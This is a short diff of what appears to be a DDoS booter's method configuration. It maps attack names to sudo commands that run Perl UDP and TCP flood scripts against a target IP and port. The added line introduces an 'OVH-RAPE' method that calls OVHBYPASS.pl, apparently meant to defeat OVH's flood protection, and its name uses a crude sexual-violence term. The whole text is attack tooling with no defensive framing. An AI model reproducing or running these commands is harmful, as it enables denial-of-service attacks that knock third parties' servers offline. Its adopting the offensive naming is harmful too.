@@ -39,3 +39,5 @@ PATH : sudo perl UDP_BPSS.pl %ip% %port% 5500 300
 UDP-MIX : sudo perl UDP_MIX.pl %ip% 300
 
 TCP_NUKE : sudo perl TCP_VOX.pl %ip% 300
+
+OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 300
